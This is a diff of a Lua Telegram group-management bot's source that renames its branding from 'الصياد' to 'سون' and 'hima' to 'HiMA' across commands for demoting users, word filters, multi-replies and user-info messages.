 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -6050,15 +6052,15 @@ function start_function(extra, result, success)
 database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 usertext = '\n ⦁ الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
-status  = '\n ⦁ تم تنزيله من الصياد '
+status  = '\n ⦁ تم تنزيله من سون'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
 return false
 end
-if text and text:match("^تنزيل الصياد @(.*)$") and Sudo(msg) then
-local username = text:match("^تنزيل الصياد @(.*)$")
+if text and text:match("^تنزيل سون@(.*)$") and Sudo(msg) then
+local username = text:match("^تنزيل سون@(.*)$")
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -6072,7 +6074,7 @@ function start_function(extra, result, success)
 if result.id_ then
 database:srem(bot_id..'CoSu'..msg.chat_id_, result.id_)
 usertext = '\n ⦁ الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
-status  = '\n ⦁ تم تنزيله من الصياد '
+status  = '\n ⦁ تم تنزيله من سون'
 texts = usertext..status
 else
 texts = ' ⦁ لا يوجد حساب بهاذا المعرف'
@@ -6082,8 +6084,8 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 return false
 end
-if text and text:match("^تنزيل الصياد (%d+)$") and Sudo(msg) then
-local userid = text:match("^تنزيل الصياد (%d+)$") 
+if text and text:match("^تنزيل سون(%d+)$") and Sudo(msg) then
+local userid = text:match("^تنزيل سون(%d+)$") 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -6097,11 +6099,11 @@ database:srem(bot_id..'CoSu'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
 usertext = '\n ⦁ الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
-status  = '\n ⦁ تم تنزيله من الصياد '
+status  = '\n ⦁ تم تنزيله من سون'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
 usertext = '\n ⦁ الـعـضو   ↚ '..userid..''
-status  = '\n ⦁ تم تنزيله من الصياد '
+status  = '\n ⦁ تم تنزيله من سون'
 send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
@@ -6452,7 +6454,7 @@ if b.first_name_ == false then
 send(msg.chat_id_, msg.id_," ⦁ حساب المنشئ محذوف")
 return false  
 end
-local UserName = (b.username_ or "SRC-hima ")
+local UserName = (b.username_ or "SRC-HiMA")
 send(msg.chat_id_, msg.id_," ⦁ منشئ الجروب  ↚ ["..b.first_name_.."](T.me/"..UserName..")")  
 end,nil)   
 end
@@ -6787,16 +6789,16 @@ return false
 end
 ------------------------------------------------------------------------ adddev2 sudog
 if text == ("رفع مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
-function Function_hima (extra, result, success)
+function Function_HiMA(extra, result, success)
 database:sadd(bot_id.."Dev:SoFi:2", result.sender_user_id_)
 Reply_Status(msg,result.sender_user_id_,"reply","⦁ تم ترقيته مطور ثانوي في البوت")  
 end
-tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_hima , nil)
+tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_HiMA, nil)
 return false 
 end
 if text and text:match("^رفع مطور ثانوي @(.*)$") and SudoBot(msg) then
 local username = text:match("^رفع مطور ثانوي @(.*)$")
-function Function_hima (extra, result, success)
+function Function_HiMA(extra, result, success)
 if result.id_ then
 if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
 send(msg.chat_id_,msg.id_,"⦁ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
@@ -6808,7 +6810,7 @@ else
 send(msg.chat_id_, msg.id_,"⦁ لا يوجد حساب بهاذا المعرف")
 end
 end
-tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_hima , nil)
+tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_HiMA, nil)
 return false 
 end
 if text and text:match("^رفع مطور ثانوي (%d+)$") and SudoBot(msg) then
@@ -6818,16 +6820,16 @@ Reply_Status(msg,userid,"reply","⦁ تم ترقيته مطور ثانوي في 
 return false 
 end
 if text == ("تنزيل مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
-function Function_hima (extra, result, success)
+function Function_HiMA(extra, result, success)
 database:srem(bot_id.."Dev:SoFi:2", result.sender_user_id_)
 Reply_Status(msg,result.sender_user_id_,"reply","⦁ تم تنزيله من المطور ثانويين")  
 end
-tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_hima , nil)
+tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_HiMA, nil)
 return false 
 end
 if text and text:match("^تنزيل مطور ثانوي @(.*)$") and SudoBot(msg) then
 local username = text:match("^تنزيل مطور ثانوي @(.*)$")
-function Function_hima (extra, result, success)
+function Function_HiMA(extra, result, success)
 if result.id_ then
 database:srem(bot_id.."Dev:SoFi:2", result.id_)
 Reply_Status(msg,result.id_,"reply","⦁ تم تنزيله من المطور ثانويين")  
@@ -6835,7 +6837,7 @@ else
 send(msg.chat_id_, msg.id_,"⦁ لا يوجد حساب بهاذا المعرف")
 end
 end
-tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_hima , nil)
+tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_HiMA, nil)
 return false
 end  
 if text and text:match("^تنزيل مطور ثانوي (%d+)$") and SudoBot(msg) then
@@ -10780,7 +10782,7 @@ local text =
 ' }\n'..' ⦁  الايدي  ↚ { '..idgp..
 ' }\n'..' ⦁  الايدي بالصوره  ↚ { '..idph..
 ' }\n'..' ⦁  الرفع  ↚ { '..setadd..
-' }\n'..' ⦁  الحظر  ↚ { '..banm..' }\n\n ⦁☩━━━━━☩𝐒𝐈𝐘𝐀𝐃☩━━━━━☩\n ⦁ قناة سورس الصياد ↓\n [ ❲[𝐒𝐈𝐘𝐀𝐃](t.me/SO_ALSIYAD)❳](t.me/SO_ALSIYAD) \n'
+' }\n'..' ⦁  الحظر  ↚ { '..banm..' }\n\n ⦁☩━━━━━☩𝐒𝐈𝐘𝐀𝐃☩━━━━━☩\n ⦁ قناة سورس سون↓\n [ ❲[𝐒𝐈𝐘𝐀𝐃](t.me/SO_ALSIYAD)❳](t.me/SO_ALSIYAD) \n'
 send(msg.chat_id_, msg.id_,text)     
 end
 if text ==('تثبيت') and msg.reply_to_message_id_ ~= 0 and Mod(msg) then  
@@ -11071,42 +11073,42 @@ end
 end
 if text and text == "منع" and msg.reply_to_message_id_ == 0 and Manager(msg)  then       
 send(msg.chat_id_, msg.id_," ⦁ ارسل الكلمه لمنعها")  
-database:set(bot_id.."hima 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
+database:set(bot_id.."HiMA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
 return false  
 end    
 if text then   
-local tsssst = database:get(bot_id.."hima 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
+local tsssst = database:get(bot_id.."HiMA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
 if tsssst == "rep" then   
 send(msg.chat_id_, msg.id_," ⦁ ارسل التحذير عند ارسال الكلمه")  
-database:set(bot_id.."hima 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
-database:set(bot_id.."hima 1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
-database:sadd(bot_id.."hima 1:List:Filter"..msg.chat_id_,text)  
+database:set(bot_id.."HiMA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
+database:set(bot_id.."HiMA1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
+database:sadd(bot_id.."HiMA1:List:Filter"..msg.chat_id_,text)  
 return false  end  
 end
 if text then  
-local test = database:get(bot_id.."hima 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
+local test = database:get(bot_id.."HiMA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
 if test == "repp" then  
 send(msg.chat_id_, msg.id_," ⦁ تم منع الكلمه مع التحذير")  
-database:del(bot_id.."hima 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
-local test = database:get(bot_id.."hima 1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
+database:del(bot_id.."HiMA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
+local test = database:get(bot_id.."HiMA1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
 if text then   
-database:set(bot_id.."hima 1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
+database:set(bot_id.."HiMA1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
 end  
-database:del(bot_id.."hima 1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
+database:del(bot_id.."HiMA1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
 return false  end  
 end
 
 if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
 send(msg.chat_id_, msg.id_," ⦁ ارسل الكلمه الان")  
-database:set(bot_id.."hima 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
+database:set(bot_id.."HiMA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
 return false  end
 if text then 
-local test = database:get(bot_id.."hima 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
+local test = database:get(bot_id.."HiMA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
 if test and test == "reppp" then   
 send(msg.chat_id_, msg.id_," ⦁ تم الغاء منعها")  
-database:del(bot_id.."hima 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
-database:del(bot_id.."hima 1:Add:Filter:Rp2"..text..msg.chat_id_)  
-database:srem(bot_id.."hima 1:List:Filter"..msg.chat_id_,text)  
+database:del(bot_id.."HiMA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
+database:del(bot_id.."HiMA1:Add:Filter:Rp2"..text..msg.chat_id_)  
+database:srem(bot_id.."HiMA1:List:Filter"..msg.chat_id_,text)  
 return false  end  
 end
 
@@ -11167,20 +11169,20 @@ tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonu
 end
 
 if text == "مسح قائمه المنع"and Manager(msg) then   
-local list = database:smembers(bot_id.."hima 1:List:Filter"..msg.chat_id_)  
+local list = database:smembers(bot_id.."HiMA1:List:Filter"..msg.chat_id_)  
 for k,v in pairs(list) do  
-database:del(bot_id.."hima 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
-database:del(bot_id.."hima 1:Add:Filter:Rp2"..v..msg.chat_id_)  
-database:srem(bot_id.."hima 1:List:Filter"..msg.chat_id_,v)  
+database:del(bot_id.."HiMA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
+database:del(bot_id.."HiMA1:Add:Filter:Rp2"..v..msg.chat_id_)  
+database:srem(bot_id.."HiMA1:List:Filter"..msg.chat_id_,v)  
 end  
 send(msg.chat_id_, msg.id_," ⦁ تم مسح قائمه المنع")  
 end
 if text == "قائمه المنع" and Manager(msg) then   
-local list = database:smembers(bot_id.."hima 1:List:Filter"..msg.chat_id_)  
+local list = database:smembers(bot_id.."HiMA1:List:Filter"..msg.chat_id_)  
 t = "\n⦁قائمة المنع \n☩━━━━━☩𝐒𝐈𝐘𝐀𝐃☩━━━━━☩\n"
 for k,v in pairs(list) do  
-local hima _Msg = database:get(bot_id.."hima 1:Add:Filter:Rp2"..v..msg.chat_id_)   
-t = t..""..k.."- "..v.." ↭ {"..hima _Msg.."}\n"    
+local HiMA_Msg = database:get(bot_id.."HiMA1:Add:Filter:Rp2"..v..msg.chat_id_)   
+t = t..""..k.."- "..v.." ↭ {"..HiMA_Msg.."}\n"    
 end  
 if #list == 0 then  
 t = "⦁لا يوجد كلمات ممنوعه"  
@@ -11865,9 +11867,9 @@ msg_type = 'MSG:NewUser'
 end
 
 
-if text == ""..(database:get(bot_id..'Name:Bot') or 'الصياد ').."" then  
-Namebot = (database:get(bot_id..'Name:Bot') or 'الصياد ')
-local hima _Msg = {
+if text == ""..(database:get(bot_id..'Name:Bot') or 'سون').."" then  
+Namebot = (database:get(bot_id..'Name:Bot') or 'سون')
+local HiMA_Msg = {
 'ننعم يروحي 😻??',
 'نعم يا قلب  '..Namebot..'',
 'عاوز اي من '..Namebot..'',
@@ -11883,12 +11885,12 @@ local hima _Msg = {
 'انا '..Namebot..' احسن البوتات 🤩♥️',
 'نعم'
 } 
-Namebot = hima _Msg[math.random(#hima _Msg)] 
+Namebot = HiMA_Msg[math.random(#HiMA_Msg)] 
 local msg_id = msg.id_/2097152/0.5  
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = 'اضف البوت الي مجموعتك ♡ ' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
+{text = 'اضف البوت الي مجموعتك ' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
 },
 }
 local function getpro(extra, result, success) 
@@ -11901,8 +11903,8 @@ end
 tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = bot_id, offset_ = 0, limit_ = 1 }, getpro, nil) 
 end
 if text == "بوت" then
-local Namebot = (database:get(bot_id..'Name:Bot') or 'الصياد ') 
-local hima _Msg = { 
+local Namebot = (database:get(bot_id..'Name:Bot') or 'سون') 
+local HiMA_Msg = { 
 'اسمي  '..Namebot..' يا قلبي 🤤💚',
 'اسمي '..Namebot..' يا روحي🙈❤️',
 'اسمي  '..Namebot..' يعمري🌚🌹',
@@ -11914,7 +11916,7 @@ local hima _Msg = {
 'اسمي  '..Namebot..' ياحياتي🧸♥️',
 'اسمي  '..Namebot..' يوتكه🙈🍑',
 } 
-Namebot = hima _Msg[math.random(#hima _Msg)] 
+Namebot = HiMA_Msg[math.random(#HiMA_Msg)] 
 local msg_id = msg.id_/2097152/0.5  
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -11922,7 +11924,7 @@ keyboard.inline_keyboard = {
 {text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
 },
 {
-{text = 'اضف البوت الي مجموعتك ♡ ' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
+{text = 'اضف البوت الي مجموعتك ' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
 },
 }
 local function getpro(extra, result, success) 
@@ -12050,7 +12052,7 @@ end
 if database:sismember(bot_id.."Sudo:User",result.id_) then
 dev = "المطور ،" else dev = "" end
 if database:sismember(bot_id.."CoSu",result.id_) then
-cu = "الصياد ،" else cu = "" end
+cu = "سون،" else cu = "" end
 if database:sismember(bot_id.."Basic:Constructor"..msg.chat_id_, result.id_) then
 crr = "منشئ اساسي ،" else crr = "" end
 if database:sismember(bot_id..'Constructor'..msg.chat_id_, result.id_) then
@@ -12131,7 +12133,7 @@ end
 if database:sismember(bot_id..'Sudo:User',result.sender_user_id_) then
 dev = 'المطور ،' else dev = '' end
 if database:sismember(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_) then
-cu = 'الصياد ،' else cu = '' end
+cu = 'سون،' else cu = '' end
 if database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_) then
 crr = 'منشئ اساسي ،' else crr = '' end
 if database:sismember(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_) then
@@ -12358,21 +12360,21 @@ local document = database:get(bot_id.."Add:Rd:Sudo:File"..text)
 local audio = database:get(bot_id.."Add:Rd:Sudo:Audio"..text)
 ------------------------------------------------------------------------
 if text and text:match("^(.*)$") then
-if database:get(bot_id.."botss:hima :Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
+if database:get(bot_id.."botss:HiMA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
 send(msg.chat_id_, msg.id_, '\n ⦁ ارسل الكلمه تريد اضافتها')
-database:set(bot_id.."botss:hima :Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
-database:set(bot_id.."botss:hima :Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
-database:sadd(bot_id.."botss:hima :List:Rd:Sudo", text)
+database:set(bot_id.."botss:HiMA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
+database:set(bot_id.."botss:HiMA:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
+database:sadd(bot_id.."botss:HiMA:List:Rd:Sudo", text)
 return false end
 end
 if text and text:match("^(.*)$") then
-if database:get(bot_id.."botss:hima :Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
+if database:get(bot_id.."botss:HiMA:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
 send(msg.chat_id_, msg.id_," ⦁ تم مسح الرد من ردود المتعدده")
-database:del(bot_id..'botss:hima :Add:Rd:Sudo:Text'..text)
-database:del(bot_id..'botss:hima :Add:Rd:Sudo:Text1'..text)
-database:del(bot_id..'botss:hima :Add:Rd:Sudo:Text2'..text)
-database:del(bot_id.."botss:hima :Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
-database:srem(bot_id.."botss:hima :List:Rd:Sudo", text)
+database:del(bot_id..'botss:HiMA:Add:Rd:Sudo:Text'..text)
+database:del(bot_id..'botss:HiMA:Add:Rd:Sudo:Text1'..text)
+database:del(bot_id..'botss:HiMA:Add:Rd:Sudo:Text2'..text)
+database:del(bot_id.."botss:HiMA:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
+database:srem(bot_id.."botss:HiMA:List:Rd:Sudo", text)
 return false
 end
 end
@@ -12386,12 +12388,12 @@ send(msg.chat_id_, msg.id_,' ⦁ لا تستطيع استخدام البوت \n 
 end
 return false
 end
-local list = database:smembers(bot_id.."botss:hima :List:Rd:Sudo")
+local list = database:smembers(bot_id.."botss:HiMA:List:Rd:Sudo")
 for k,v in pairs(list) do  
-database:del(bot_id.."botss:hima :Add:Rd:Sudo:Text"..v) 
-database:del(bot_id.."botss:hima :Add:Rd:Sudo:Text1"..v) 
-database:del(bot_id.."botss:hima :Add:Rd:Sudo:Text2"..v)   
-database:del(bot_id.."botss:hima :List:Rd:Sudo")
+database:del(bot_id.."botss:HiMA:Add:Rd:Sudo:Text"..v) 
+database:del(bot_id.."botss:HiMA:Add:Rd:Sudo:Text1"..v) 
+database:del(bot_id.."botss:HiMA:Add:Rd:Sudo:Text2"..v)   
+database:del(bot_id.."botss:HiMA:List:Rd:Sudo")
 end
 send(msg.chat_id_, msg.id_," ⦁تم مسح ردود المتعدده")
 end
@@ -12799,7 +12801,7 @@ if b.username_ then
 User_id = "@"..b.username_
 else
 User_id = msg.sender_user_id_
-end --الكود حصري سورس الصياد يعني لو بكتهن راح اعرفك انت الاخذتهن
+end --الكود حصري سورس سونيعني لو بكتهن راح اعرفك انت الاخذتهن
 local t = "\n ⦁المستخدم ~ ["..User_id .."] يصيح المشرفين \n☩━━━━━☩𝐒𝐈𝐘𝐀𝐃☩━━━━━☩\n"
 k = 0
 for i,v in pairs(data.members_) do
@@ -12840,7 +12842,7 @@ send(msg.chat_id_, msg.id_,' ⦁ لا تستطيع استخدام البوت \n 
 end
 return false
 end
-local list = database:smembers(bot_id.."botss:hima :List:Rd:Sudo")
+local list = database:smembers(bot_id.."botss:HiMA:List:Rd:Sudo")
 text = "\nقائمة ردود المتعدده \n☩━━━━━☩𝐒𝐈𝐘𝐀𝐃☩━━━━━☩\n"
 for k,v in pairs(list) do
 db = "رساله "
@@ -12862,7 +12864,7 @@ send(msg.chat_id_, msg.id_,' ⦁ لا تستطيع استخدام البوت \n 
 end
 return false
 end
-database:set(bot_id.."botss:hima :Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
+database:set(bot_id.."botss:HiMA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
 return send(msg.chat_id_, msg.id_," ⦁ارسل الرد الذي اريد اضافته")
 end
 if text == "مسح رد متعدد" and CoSu(msg) then
@@ -12875,58 +12877,58 @@ send(msg.chat_id_, msg.id_,' ⦁ لا تستطيع استخدام البوت \n 
 end
 return false
 end
-database:set(bot_id.."botss:hima :Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
+database:set(bot_id.."botss:HiMA:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
 return send(msg.chat_id_, msg.id_," ⦁ارسل الان الكلمه لمسحها ")
 end
 if text then  
-local test = database:get(bot_id.."botss:hima :Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
-if database:get(bot_id.."botss:hima :Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
-database:set(bot_id.."botss:hima :Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
+local test = database:get(bot_id.."botss:HiMA:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
+if database:get(bot_id.."botss:HiMA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
+database:set(bot_id.."botss:HiMA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
 if text then   
 text = text:gsub('"',"") 
 text = text:gsub('"',"") 
 text = text:gsub("`","") 
 text = text:gsub("*","") 
-database:set(bot_id.."botss:hima :Add:Rd:Sudo:Text"..test, text)  
+database:set(bot_id.."botss:HiMA:Add:Rd:Sudo:Text"..test, text)  
 end  
 send(msg.chat_id_, msg.id_," ⦁تم حفظ الرد الاول ارسل الرد الثاني")
 return false  
 end  
 end
 if text then  
-local test = database:get(bot_id.."botss:hima :Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
-if database:get(bot_id.."botss:hima :Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
-database:set(bot_id.."botss:hima :Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
+local test = database:get(bot_id.."botss:HiMA:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
+if database:get(bot_id.."botss:HiMA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
+database:set(bot_id.."botss:HiMA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
 if text then   
 text = text:gsub('"',"") 
 text = text:gsub('"',"") 
 text = text:gsub("`","") 
 text = text:gsub("*","") 
-database:set(bot_id.."botss:hima :Add:Rd:Sudo:Text1"..test, text)  
+database:set(bot_id.."botss:HiMA:Add:Rd:Sudo:Text1"..test, text)  
 end  
 send(msg.chat_id_, msg.id_," ⦁تم حفظ الرد الثاني ارسل الرد الثالث")
 return false  
 end  
 end
 if text then  
-local test = database:get(bot_id.."botss:hima :Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
-if database:get(bot_id.."botss:hima :Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
-database:set(bot_id.."botss:hima :Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
+local test = database:get(bot_id.."botss:HiMA:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
+if database:get(bot_id.."botss:HiMA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
+database:set(bot_id.."botss:HiMA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
 if text then   
 text = text:gsub('"',"") 
 text = text:gsub('"',"") 
 text = text:gsub("`","") 
 text = text:gsub("*","") 
-database:set(bot_id.."botss:hima :Add:Rd:Sudo:Text2"..test, text)  
+database:set(bot_id.."botss:HiMA:Add:Rd:Sudo:Text2"..test, text)  
 end  
 send(msg.chat_id_, msg.id_," ⦁تم حفظ الرد")
 return false  
 end  
 end
 if text then
-local Text = database:get(bot_id.."botss:hima :Add:Rd:Sudo:Text"..text)   
-local Text1 = database:get(bot_id.."botss:hima :Add:Rd:Sudo:Text1"..text)   
-local Text2 = database:get(bot_id.."botss:hima :Add:Rd:Sudo:Text2"..text)   
+local Text = database:get(bot_id.."botss:HiMA:Add:Rd:Sudo:Text"..text)   
+local Text1 = database:get(bot_id.."botss:HiMA:Add:Rd:Sudo:Text1"..text)   
+local Text2 = database:get(bot_id.."botss:HiMA:Add:Rd:Sudo:Text2"..text)   
 if Text or Text1 or Text2 then 
 local texting = {
 Text,
@@ -12974,7 +12976,7 @@ end
 end
 
 -------------------------------
-if text == ""..(database:get(bot_id..'Name:Bot') or 'الصياد ').." غادر" or text == 'غادر' then  
+if text == ""..(database:get(bot_id..'Name:Bot') or 'سون').." غادر" or text == 'غادر' then  
 if Sudo(msg) and not database:get(bot_id..'Left:Bot'..msg.chat_id_)  then 
 tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
 send(msg.chat_id_, msg.id_,'※ تم مغادرة المجموعه') 
@@ -13584,7 +13586,7 @@ end
 end
 end
 if text then 
-list = {'وتكه'}
+list = {'مش'}
 for k,v in pairs(list) do
 if string.find(text,v) ~= nil then
 local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
@@ -13592,7 +13594,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[بتعاكس انت لحد ميقولو عليك حكاك بتحصل بتحصل 🙂😂](t.me/SO_ALSIYAD)')
+send(msg.chat_id_,msg.id_, '[مش بدودو ..😹👻](t.me/SO_ALSIYAD)')
 return false
 end
 end
@@ -14135,12 +14137,12 @@ else
 username = 'لا يوجد '
 end
 if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, sofi.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n¦• 𝚄𝚂𝙴𝚁 ↬  「'..username..'」  ↝💘\n¦• 𝙼𝚂𝙶𝚂↬  「'..Msguser..'」  ↝💘\n¦• 𝚁𝙰𝙽𝙺↬ 「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」  ↝💘\n¦• 𝙸𝙳↬   「'..msg.sender_user_id_..'」 ↝💘\n¦• 𝙱𝙸𝙾 ↬ 「'..getbioY..'」 ↝💘\n ¦• 𝒄𝒉↬  「SO_ALSIYAD 」   ↝💘\n')
+sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, sofi.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n¦• 𝚄𝚂𝙴𝚁 ↬  「'..username..'」  ↝💘\n¦• 𝙼𝚂𝙶𝚂↬  「'..Msguser..'」  ↝💘\n¦• 𝚁𝙰𝙽𝙺↬ 「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」  ↝💘\n¦• 𝙸𝙳↬   「'..msg.sender_user_id_..'」 ↝💘\n¦• 𝙱𝙸𝙾 ↬ 「'..getbioY..'」 ↝💘\n ¦• 𝒄𝒉↬  「@SO_ALSIYAD」   ↝💘\n')
 else 
 if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
-send(msg.chat_id_, msg.id_,'[\n ¦✙ بيك عزيزي 「'..Name..'」 \n¦• 𝚄𝚂𝙴𝚁 ↬  「'..Name..'」    ↝💘\n¦• 𝙼𝚂𝙶𝚂↬ 「'..Msguser..'」.   ↝💘\n ¦• 𝚁𝙰𝙽𝙺↬ 「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」    ↝💘\n¦• 𝙸𝙳↬  「'..msg.sender_user_id_..'」    ↝💘\n¦• 𝒄𝒉↬   「SO_ALSIYAD 」 ↝🇧??\n')
+send(msg.chat_id_, msg.id_,'[\n ¦✙ بيك عزيزي 「'..Name..'」 \n¦• 𝚄𝚂𝙴𝚁 ↬  「'..Name..'」    ↝💘\n¦• 𝙼𝚂𝙶𝚂↬ 「'..Msguser..'」.   ↝💘\n ¦• 𝚁𝙰𝙽𝙺↬ 「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」    ↝💘\n¦• 𝙸𝙳↬  「'..msg.sender_user_id_..'」    ↝💘\n¦• 𝒄𝒉↬   「@SO_ALSIYAD」 ↝🇧??\n')
 else
-send(msg.chat_id_, msg.id_, '\n ⦁ الصوره ⇜ ليس لديك صور في حسابك'..'[\n¦• 𝚄𝚂𝙴𝚁 ↬ 「'..username..'」\n¦• 𝙼𝚂𝙶𝚂↬ 「'..Msguser..'」\n¦• 𝙸𝙳↬  「'..msg.sender_user_id_..'」\n¦• 𝒄𝒉↬  「SO_ALSIYAD 」\n')
